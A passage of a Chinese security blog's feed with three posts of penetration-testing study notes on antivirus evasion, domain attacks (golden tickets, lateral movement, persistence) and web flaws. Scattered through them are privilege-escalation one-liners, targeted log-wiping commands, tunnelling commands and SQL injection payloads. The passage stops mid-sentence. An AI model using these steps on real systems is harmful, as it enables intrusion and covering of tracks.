title="一些免杀的了解"></a>一些免杀的了解</h4><p><strong>做免杀的原理：</strong><br>就是fuzz定位出被查杀的语句，然后对被查杀那部分进行加密、编码、动态执行、拆分拼接、特定条件执行等等。</p><p><strong>免杀分类：</strong><br>为静态免杀（单纯看hash值）、流量免杀（有通信流量就杀）、内存免杀（看内存运行特征）、动态免杀（行为感知）</p><p><strong>免杀语言分类：</strong></p><ol><li>编译型语言，编译器一次性将所有源代码编译为一个不可跨平台执行的可执行程序，一次编译可以重复执行（C、C++、Golang、汇编等）</li><li>解释型语言，使用解释器一边执行一边转换，不会生成可执行程序。（JavaScript、Python、PHP、Shell等）</li></ol><p><strong>免杀方法：</strong></p><ol><li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li><li>shellcode加载器，改变加载到内存的方式和加密方式（主流）</li><li>反射dll加载，把dll加密，远程下载到内存中再解密执行（高级）</li></ol><h5 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a>无文件执行木马的方式有哪些？</h5><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）<br>VB.script（脚本解析器） 》》》cscript.exe（应用程序）<br>bat处理 （脚本解析器） 》》》cmd.exe（应用程序）<br>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h5 id="怎么做shellcode免杀？"><a href="#怎么做shellcode免杀？" class="headerlink" title="怎么做shellcode免杀？"></a>怎么做shellcode免杀？</h5><ol><li>编码</li><li>加壳</li><li>混淆</li><li>分离免杀</li><li>特征码修改</li><li>添加无用逻辑语句</li><li>重写api</li></ol><h5 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a>分离免杀怎么做？</h5><p>分为加载器和shellcode两部分，一般将shellcode存储在网页或者图片中，然后加载器远程加载存在shellcode的网页或者图片之类的</p><h5 id="powershell怎么远程加载？"><a href="#powershell怎么远程加载？" class="headerlink" title="powershell怎么远程加载？"></a>powershell怎么远程加载？</h5><p>可以远程加载mimikazt，远控文件，exe可执行文件实现无文件落地。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;Nmap常用命令&quot;&gt;&lt;a href=&quot;#Nmap常用命令&quot; class=&quot;headerlink&quot; title=&quot;Nmap常用命令&quot;&gt;&lt;/a&gt;Nmap常用命令&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;nmap hostname/ip或者多个ip或者子网192.168.123.</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://liu1272.github.io/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://liu1272.github.io/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-06T05:13:00.000Z</published>
    <updated>2023-08-12T02:48:34.062Z</updated>
    
    <content type="html"><![CDATA[<h5 id="内网渗透的流程"><a href="#内网渗透的流程" class="headerlink" title="内网渗透的流程"></a>内网渗透的流程</h5><ol><li>从外网拿下一个主机当做跳板</li><li>用<code>net user /domian</code>命令查看跳板机是否在域内，探测存活主机</li><li>提权、提取hash</li><li>进行横向移动，定位dc位置</li><li>查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权</li><li>最后制作黄金票据做好维权，清理日志</li></ol><h5 id="内网渗透的一些基础概念"><a href="#内网渗透的一些基础概念" class="headerlink" title="内网渗透的一些基础概念"></a>内网渗透的一些基础概念</h5><table><thead><tr><th>简写</th><th>全称</th><th>描述</th></tr></thead><tbody><tr><td>DC</td><td>Domain Controller</td><td>域控</td></tr><tr><td>KDC</td><td>Key Distribution Center</td><td>秘钥分发中心</td></tr><tr><td>AD</td><td>Account Database</td><td>账户数据库</td></tr><tr><td>ST</td><td>Service Tickets</td><td>ST服务票据，由TGS服务发送</td></tr><tr><td>AS</td><td>Authentication Server</td><td>身份验证服务，认证用户的身份，并为其发放TGT的服务</td></tr><tr><td>AP</td><td>Application Server</td><td>提供用户所需的服务</td></tr><tr><td>TGS</td><td>Ticket Granting Server</td><td>票据授予发放服务</td></tr><tr><td>TGT</td><td>Ticket Granting Ticket</td><td>TGT认证票据，由AS服务发放，存储在内存，默认有效期为10小时</td></tr><tr><td>黄金票据</td><td>Golden Ticket</td><td>使用域账号krbtgt的NTLM Hash进行加密</td></tr><tr><td>白银票据</td><td>Silver Ticket</td><td>使用服务账户的NTLM Hash进行加密</td></tr></tbody></table><h5 id="socket通信与代理"><a href="#socket通信与代理" class="headerlink" title="socket通信与代理"></a>socket通信与代理</h5><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议+端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读/写IO、关闭），其中就包含了TCP的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现负载均衡。（负载均衡也是防御DOS攻击的一种方式）<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code>是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code>是路由器上配置一个公网IP地址池，当内网地址访问外网时从地址池里获取公网IP进行映射。当公网IP地址池分配完时，只能等待被占用的公网IP被释放后，其他主机才能获取公网IP访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code>是允许多个内网地址映射到同一个公网IP的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向socks</strong>：当一个机器同时存在内外网IP时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。<br><a href="https://smms.app/image/iTNEZ9mCukscY68" target="_blank"><img src="https://s2.loli.net/2023/08/06/iTNEZ9mCukscY68.png" ></a><br><strong>反弹socks</strong>：当目标机器没有公网IP，但可访问内网资源时。攻击者可以在内网跳板机上运行EarthWorm使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。<br><a href="https://smms.app/image/wH4klfLjbCJ7Qhi" target="_blank"><img src="https://s2.loli.net/2023/08/06/wH4klfLjbCJ7Qhi.png" ></a></p><h5 id="kerberos协议认证是什么？"><a href="#kerberos协议认证是什么？" class="headerlink" title="kerberos协议认证是什么？"></a>kerberos协议认证是什么？</h5><p>Kerberos是一种网络身份认证的协议，协议设计目的是通过使用秘钥加密技术为客户端/服务器应用程序提供强身份验证。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术执行认证服务。<br><strong>Kerberos认证流程：</strong><br>票据中心授予的票据先去AS身份验证服务，返回身份验证，带着身份验证去TGS拿票据，带着拿回来的票据去服务器。</p><h5 id="白银票据与黄金票据的原理？"><a href="#白银票据与黄金票据的原理？" class="headerlink" title="白银票据与黄金票据的原理？"></a>白银票据与黄金票据的原理？</h5><p><strong>金票</strong>：在 Kerberos 认证中,Client 通过身份认证后,AS 会给 Client一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改。<br><strong>银票</strong>：如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三步，Client 带着 ST 和Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪造的门票只对部分服务起作用。<br><strong>金票和银票的区别</strong>：<br>获取的权限不同<br>认证流程不同<br>加密方式不同</p><h5 id="针对kerbores的攻击有哪些？"><a href="#针对kerbores的攻击有哪些？" class="headerlink" title="针对kerbores的攻击有哪些？"></a>针对kerbores的攻击有哪些？</h5><ol><li>用户名爆破</li><li>密码喷洒和密码爆破</li><li>Kerberoasting</li><li>ASRepRoasting</li><li>黄金票据和白银票据</li><li>MS14-068</li><li>非约束委派、约束委派、基于资源的约束委派</li><li>票据传递（ptt/ptk/ptc）</li><li>mimikatz加密降级攻击(万能钥匙)</li><li>使用恶意的kerberos证书做权限维持</li></ol><h5 id="黄金票的条件要求？"><a href="#黄金票的条件要求？" class="headerlink" title="黄金票的条件要求？"></a>黄金票的条件要求？</h5><p>1.域名称 AD PowerShell模块：（Get-ADDomain）.DNSRoot<br>2.域的SID 值 AD PowerShell模块：（Get-ADDomain）.DomainSID.Value（就是域成员SID值去掉最后的）<br>3.目标服务器的 FQDN<br>4.可利用的服务<br>5.域的KRBTGT账户NTLM密码哈希<br>6.需要伪造的用户名<br>一旦攻击者拥有管理员访问域控制器的权限，就可以使用Mimikatz来提取KRBTGT帐户密码哈希值</p><h5 id="票据伪造"><a href="#票据伪造" class="headerlink" title="票据伪造"></a>票据伪造</h5><p>票据分为黄金票据和白银票据。<br>黄金票据是伪造TGT，伪造黄金票据必须拿到域控管理员的权限才可以。<br>伪造黄金票据需要：域名城、域SID值、域的KRBTGT账户、NTLM哈希密码、伪造用户名</p><h5 id="横向连接方式"><a href="#横向连接方式" class="headerlink" title="横向连接方式"></a>横向连接方式</h5><p>$IPC、Psexec、WMI、Schtasks、AT、SC、WINRM</p><h5 id="如何获取内网中机器数量"><a href="#如何获取内网中机器数量" class="headerlink" title="如何获取内网中机器数量"></a>如何获取内网中机器数量</h5><p>可以使用命令net user /domian<br>使用扫描器扫一下</p><h5 id="内网环境不出网怎么办？"><a href="#内网环境不出网怎么办？" class="headerlink" title="内网环境不出网怎么办？"></a>内网环境不出网怎么办？</h5><ol><li>通过webshell实现内网socket代理</li><li>正向链接</li><li>ssh隧道</li><li>协议不同出网的方式不同，如dns对应dnscat2 tcp对应</li><li>测试是否是特定协议或端口出网</li></ol><h5 id="mimikatz使用方法"><a href="#mimikatz使用方法" class="headerlink" title="mimikatz使用方法"></a>mimikatz使用方法</h5><p>mimikatz是一款强大的系统密码破解获取工具。可以破解哈希值，是一个可加载的Meterpreter模块。<br>如果system的权限无法执行执行。需要先进行提权。<br>在meterpreter中输入<code>run post/multi/recon/local_exploit_suggester</code>，进行提权漏洞检测。</p><h5 id="拿下边界机器如何内网渗透？"><a href="#拿下边界机器如何内网渗透？" class="headerlink" title="拿下边界机器如何内网渗透？"></a>拿下边界机器如何内网渗透？</h5><p>拿下机器后，使用代理访问内网<br>windows环境：reGeorg与proxifier<br>Linux环境：reGeorg与proxychains，<br>使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息，这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的，拿到的各种记录会暴露出部分内网通讯的ip.</p><h5 id="linux常见的提权办法"><a href="#linux常见的提权办法" class="headerlink" title="linux常见的提权办法"></a>linux常见的提权办法</h5><ol><li>uid提权 (find / -perm -u=s -type f 2&gt;/dev/null)</li><li><code>sudo git help config !/bin/bash</code> 或者 <code>！&#39;sh&#39;</code>完成提权</li><li>脏牛提权</li><li>内核提权</li><li>环境劫持</li><li>suid提权</li><li>cve-2021-4034</li><li>docker提权</li></ol><h5 id="Windows提权的若干办法？"><a href="#Windows提权的若干办法？" class="headerlink" title="Windows提权的若干办法？"></a>Windows提权的若干办法？</h5><ol><li>系统漏洞提权<br>通过 Webshell 命令行执行systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果cmd无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</li><li>sc 命令提权（administrator–&gt;system）<br>例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code>就得到了一个system权限的cmd环境</li><li>不带引号的服务路径<br>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如<code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在c盘创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</li><li>不安全的服务权限提升<br>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</li><li>绕过系统 UAC 提升<br>可通过 msf 里面的 getsystem 绕过 UAC,也可以通过 kail 模块的exploit/windows/local/bypassuac_injection、exploit/windows/local/bypassuac_vbs、exploit/windows/local/ask 绕过 UAC</li></ol><h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><p><strong>Windows机器：</strong></p><ol><li>替换系统文件类(shift 后门,放大镜后门)</li><li>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</li><li>文件类<br>自启动文件夹、office Word StartUp 劫持</li><li>计划任务<br>schtasks 、WMI、bitsadmin</li></ol><p><strong>Linux:</strong></p><ol><li>预加载型动态链接库后门</li><li>strace 后门</li><li>SSH 后门</li><li>SUID 后门</li><li>inetd 服务后门</li><li>协议后门</li><li>vim 后门</li><li>PAM 后门</li><li>进程注入</li><li>Rootkit</li><li>端口复用</li></ol><h5 id="拿到shell后如何接管域控？"><a href="#拿到shell后如何接管域控？" class="headerlink" title="拿到shell后如何接管域控？"></a>拿到shell后如何接管域控？</h5><p>如果拿到的就是域内用户，定位一下域控，提取本机<code>hash</code>看域管是否登陆过本机，是否有域用户的进程之类的注入域用户进程窃取下权限，然后使用一些域内漏洞来提权到域管从而接管域控，然后通过<code>dcsync</code>权限维持或者<code>adminsdhound</code>权限维持，也可以修改机器账号的<code>useraccount</code>为 8192 达成权限维持。<br>（注：把机器账户的UserAccountControl属性修改为8192后，活动目录就会认为这个机器账户是域控）</p><h5 id="内网渗透搭建隧道常见的攻击？"><a href="#内网渗透搭建隧道常见的攻击？" class="headerlink" title="内网渗透搭建隧道常见的攻击？"></a>内网渗透搭建隧道常见的攻击？</h5><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6情况、icmp情况、Gre隧道0<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh隧道、http隧道、https隧道、dns隧道</p><h5 id="内网横向扩展具体方法？"><a href="#内网横向扩展具体方法？" class="headerlink" title="内网横向扩展具体方法？"></a>内网横向扩展具体方法？</h5><p>密码喷洒、IPC$、WMI、mimikatz、PTH、MS14-068、web漏洞、系统漏洞</p><h5 id="KDC服务默认开放哪些端口？"><a href="#KDC服务默认开放哪些端口？" class="headerlink" title="KDC服务默认开放哪些端口？"></a>KDC服务默认开放哪些端口？</h5><p>88 kerberos krb5、464kerberos kpasswd（v5）</p><h5 id="桌面有管理员会话，想要做会话劫持怎么做？"><a href="#桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="桌面有管理员会话，想要做会话劫持怎么做？"></a>桌面有管理员会话，想要做会话劫持怎么做？</h5><p>提权到system权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。<br>终端服务会话可以是连接状态也可以是未连接状态</p><h5 id="域内攻击方法有什么？"><a href="#域内攻击方法有什么？" class="headerlink" title="域内攻击方法有什么？"></a>域内攻击方法有什么？</h5><p>MS14-068、Roasting攻击离线爆破密码、非约束性委派、基于资源的约束委派、ntlmrelay、CVE-2021-42287/CVE-2021-42278</p><h5 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h5><p>procdump+mimikatz 转储然后用mimikatz离线读取，或者Sam获取然后离线读取。<br>windows server 2012之后，或者打了补丁都抓不到了。<br>只能翻阅文件查找运维等等是否记录密码，或者hash传递、或者获取浏览器的账号密码。</p><h5 id="psexec和wmic的区别"><a href="#psexec和wmic的区别" class="headerlink" title="psexec和wmic的区别"></a>psexec和wmic的区别</h5><p>psexec会记录大量日志，wmic不会记录日志并且更为隐蔽</p><h5 id="横向渗透命令执行手段"><a href="#横向渗透命令执行手段" class="headerlink" title="横向渗透命令执行手段"></a>横向渗透命令执行手段</h5><p>psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令</p><h5 id="内网的白名单如何突破？"><a href="#内网的白名单如何突破？" class="headerlink" title="内网的白名单如何突破？"></a>内网的白名单如何突破？</h5><ul><li>利用已在白名单中的软件执行目标代码，甚至发动无文件攻击</li><li>白名单污染</li><li>暴力破解白名单防护软件</li></ul><h5 id="内网135端口具体有哪些利用方式？"><a href="#内网135端口具体有哪些利用方式？" class="headerlink" title="内网135端口具体有哪些利用方式？"></a>内网135端口具体有哪些利用方式？</h5><p>爆破用户、wmic执行命令进行横向</p><h5 id="怎么做域控定位？"><a href="#怎么做域控定位？" class="headerlink" title="怎么做域控定位？"></a>怎么做域控定位？</h5><p><strong>cmd定位</strong>：<br>net group “Domain controllers” /Domain //查询域控<br>net time /domain//方式来定位域控，显示域控时间<br><strong>DNS解析记录定位</strong>：<br><code>nslookup -type=all _ldap._tcp.dc._msdcs.tubai.com</code><br>若当前主机dns为域内dns，则可以通过解析记录定位端口探测定位：扫描内网中同时开放<code>389</code>、<code>636</code>与<code>53</code>的机器，<code>389</code>默认是<code>LDAP</code>协议端口，<code>636</code>端口是<code>LDAPS</code>，<code>53</code>端口默认是DNS端口，主要用于域名解析，通过DNS服务器可以实现域名与ip地址之间转换，他们都是域控机器开放的端口<br><strong>SPN扫描定位</strong>：由于<code>SPN</code>本身就是正常的<code>kerberos</code>请求，所以扫描隐蔽，它不同于<code>TCP</code>与<code>UDP</code>常规端口扫描。大部分windows已经自带<code>setspn.exe</code>，且此操作无需管理权限<br>命令：setspn -T tubai.com -Q /<br>扫描结果中根据：<code>CN=AD-SERVER,OU=Domain Controllers,DC=tubai,DC=com</code>来进行域控的定位</p><h5 id="域管定位"><a href="#域管定位" class="headerlink" title="域管定位"></a>域管定位</h5><p>net group “Domain Admins” /domain //查询域管理员<br>此外还可以通过一些工具定位：PSloggedon.exe、PVefindaduser.exe、powerView.ps1</p><h5 id="mimikatz是从哪个进程抓hash"><a href="#mimikatz是从哪个进程抓hash" class="headerlink" title="mimikatz是从哪个进程抓hash?"></a>mimikatz是从哪个进程抓hash?</h5><p>mimikatz是从哪个进程抓hash?</p><h5 id="win2012-无法破解hash-怎么上桌面"><a href="#win2012-无法破解hash-怎么上桌面" class="headerlink" title="win2012 无法破解hash 怎么上桌面?"></a>win2012 无法破解hash 怎么上桌面?</h5><p>hash pth传递</p><h5 id="入侵Linux服务器后需要清除哪些日志？"><a href="#入侵Linux服务器后需要清除哪些日志？" class="headerlink" title="入侵Linux服务器后需要清除哪些日志？"></a>入侵Linux服务器后需要清除哪些日志？</h5><p>web日志，如 apache 的 access.log,error.log。<br>直接将日志清除过于明显,一般使用sed 进行定向清除<code>sed -i -e ‘/192.169.1.1/d’</code><br>history 命令的清除，也是对~/.bash_history 进行定向清除<br>wtmp日志的清除   /var/log/wtmp<br>登录日志清除   /var/log/secure</p><h5 id="内网渗透要怎么做？"><a href="#内网渗透要怎么做？" class="headerlink" title="内网渗透要怎么做？"></a>内网渗透要怎么做？</h5><p>第一种方法：<br>在具备Webshell的情况下，通过Webshell直接上传CS木马到对方服务器运行，在CS软件上面开启 SocksProxy代理，把 kail 直接通过cs socksProxy代理攻击内网进行横向渗透。<br>第二种方法：<br>通过reGeorg+Proxifie进行内网渗透，把 tunnel.nosocket.php 脚本通过Webshell上传到 Web 站点目录进行访问，在本地自己电脑上面执行<code>reGeorgSocksProxy.py -p 9999 –u http://IP 地址/tunnel.nosocket.php</code>，最后配置 Proxifier 本地代理地址与端口进行横向内网渗透。</p><h5 id="内网横向渗透的一些攻击技巧"><a href="#内网横向渗透的一些攻击技巧" class="headerlink" title="内网横向渗透的一些攻击技巧"></a>内网横向渗透的一些攻击技巧</h5><ul><li>通过 nmap、nessus 扫描整个内网 ip 主机漏洞</li></ul><pre><code>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝2代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi</code></pre><ul><li>通过 nmap 扫内网 Web 站点端口，手动或自动进行漏洞检测</li></ul><pre><code>注入、命令执行、反序列化、文件上传、弱口令等</code></pre><ul><li>通过 ntscan、Bruter、hydra 工具对内网弱口令探测，同时很可能存在密码复用现象</li><li>适当的对内网主机进行 ARP 抓取密码</li><li>如果内网有 AD 域的情况下，可以通过 MS14-068 漏洞、黄金票据、白银票据进行域控攻击，拿下域控就等于基本拿下整个内网</li></ul><h5 id="windows-cmd如何下载文件？"><a href="#windows-cmd如何下载文件？" class="headerlink" title="windows cmd如何下载文件？"></a>windows cmd如何下载文件？</h5><ol><li>certutil.exe</li><li>powershell</li><li>bitsadmin</li><li>vbs</li><li>ftp</li></ol><h5 id="怎么隐藏攻击痕迹？"><a href="#怎么隐藏攻击痕迹？" class="headerlink" title="怎么隐藏攻击痕迹？"></a>怎么隐藏攻击痕迹？</h5><ol><li>跳板</li><li>代理服务器</li><li>Tor</li><li>日志</li><li>清除历史记录</li><li>粉碎文件</li></ol><h5 id="Hash和NTML-hash区别？"><a href="#Hash和NTML-hash区别？" class="headerlink" title="Hash和NTML hash区别？"></a>Hash和NTML hash区别？</h5><p>NTLM Hash（NT LAN Manager）是支持Net NTLM认证协议及本地认证过程中的一个重要参数。其长度为32位，由数字与字母组成。<br>ntml hash生成方式是将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位十六进制数字串</p><h5 id="内网中的信息收集技术"><a href="#内网中的信息收集技术" class="headerlink" title="内网中的信息收集技术"></a>内网中的信息收集技术</h5><pre><code>【主机信息收集】1. 网络配置 ipconfig /all2. 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;3. 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;4. 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct GET displayName,productState,pathToSignedProductExe5. 用户列表 net user6. 本地管理员信息 net localgroup administrators7. 端口信息 netstat –ano8. 补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn9. 查防火墙 netsh firewall show config【域内信息收集】是否有域：使用ipconfig /all命令可以查看网关IP地址、DNS的IP地址以及判断当前主机是否在域内：通过反 向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上登录域信息：net config workstationICMP探测内网：for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr &quot;TTL=&quot;ARP探测内网：端口信息收集：查询域信息：net view /domain查询域主机：net view /domain:XXX查询域用户：net group /domain查找域控：Nslookup -type=SRV _ldap._tcp net time /domain net group &quot;Domain Controllers&quot; /domain查域用户信息：net user /domain查询域管理员：net group &quot;Domain Admins&quot; /domain查询域sid信息：whoami /all</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;内网渗透的流程&quot;&gt;&lt;a href=&quot;#内网渗透的流程&quot; class=&quot;headerlink&quot; title=&quot;内网渗透的流程&quot;&gt;&lt;/a&gt;内网渗透的流程&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;从外网拿下一个主机当做跳板&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;net user /domi</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>阅经题总结</title>
    <link href="https://liu1272.github.io/2023/08/01/%E9%98%85%E7%BB%8F%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/08/01/%E9%98%85%E7%BB%8F%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2023-08-01T04:59:00.000Z</published>
    <updated>2023-08-02T13:33:11.487Z</updated>
    
    <content type="html"><![CDATA[<h5 id="拿到目标站以后的渗透思路？"><a href="#拿到目标站以后的渗透思路？" class="headerlink" title="拿到目标站以后的渗透思路？"></a>拿到目标站以后的渗透思路？</h5><p>渗透测试流程：</p><ol><li>项目前期准备工作</li><li>信息收集：whois、网站源IP、开放端口、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙WAF</li><li>自动化漏洞扫描：Nessus, AWVS，XRAY</li><li>手动挖掘：逻辑漏洞</li><li>验证漏洞</li><li>修复建议</li><li>（如果有）基线检查/复验漏洞</li><li>输出报告</li></ol><h5 id="如何绕过CDN查真实IP？"><a href="#如何绕过CDN查真实IP？" class="headerlink" title="如何绕过CDN查真实IP？"></a>如何绕过CDN查真实IP？</h5><ol><li>多地ping看是否有cdn（基本上非洲的那些ping就是真的了）</li><li>邮件订阅或者rss订阅（QQ邮箱的ip溯源）</li><li>二级域名可能不会做cdn</li><li>nslookup <a href="http://xxx.com/">http://xxx.com</a> 国外dns</li></ol><h5 id="sleep函数被禁用后怎么进行sql注入？"><a href="#sleep函数被禁用后怎么进行sql注入？" class="headerlink" title="sleep函数被禁用后怎么进行sql注入？"></a>sleep函数被禁用后怎么进行sql注入？</h5><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句（例如MD5）使数据库查询时间变长，从而达到延时注入的效果。</p><pre><code>AND (SELECT count(*) FROM information_schema.columns A,information_schema.columns B, information_schema.SCHEMATA C);</code></pre><h5 id="哪些地方存在xxe？架构问题？"><a href="#哪些地方存在xxe？架构问题？" class="headerlink" title="哪些地方存在xxe？架构问题？"></a>哪些地方存在xxe？架构问题？</h5><p><strong>xxe常见场景</strong><br>pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br><strong>xxe危害</strong><br>读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定，file http ftp是常用的<br><strong>防范</strong><br>python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml<br>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：<br>javax.xml.stream.XMLStreamReader;<br>javax.xml.parsers.DocumentBuilderFactory;</p><h5 id="如何绕过Http-only？"><a href="#如何绕过Http-only？" class="headerlink" title="如何绕过Http-only？"></a>如何绕过Http-only？</h5><p>HTTP-Only禁止的是JS读取cookie信息，Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄露</p><h5 id="SQL二次注入？"><a href="#SQL二次注入？" class="headerlink" title="SQL二次注入？"></a>SQL二次注入？</h5><p>第一次进行数据库插入数据的时候，仅仅只是使用了<code>addslashes</code>或者是借助<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，在写入数据库的时候还是保留了<br>原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>一些交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列，</p><ol><li>爆库 <code>group_concat(schema_name) from information_schema.schemata</code></li><li>爆表 <code>group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39;</code></li><li>获取数据 <code>concat(flag) from flag</code><br>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</li></ol><h5 id="SQLserver提权"><a href="#SQLserver提权" class="headerlink" title="SQLserver提权?"></a>SQLserver提权?</h5><p><strong>xp_cmdshell提权</strong><br>xp_cmdshell是Sql 